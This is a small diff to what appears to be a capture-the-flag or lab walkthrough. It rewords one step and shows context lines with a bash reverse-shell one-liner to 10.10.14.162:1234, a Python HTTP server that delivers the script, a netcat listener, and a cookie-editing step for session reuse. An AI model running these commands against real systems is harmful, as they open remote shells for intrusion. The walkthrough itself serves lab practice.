@@ -269,7 +269,7 @@ Now we create reverse shell *pasha.sh*
 bash -i >& /dev/tcp/10.10.14.162/1234 0>&1
 ```
 
-After start `python3 -m http.server 8888`
+After we start `python3 -m http.server 8888` to get *pasha.sh*
 And use `nc -nlvp 1234`
 
 We need install extensions *Cookie-Editor* in Mozilla fire fox. And login with "Remeber me".
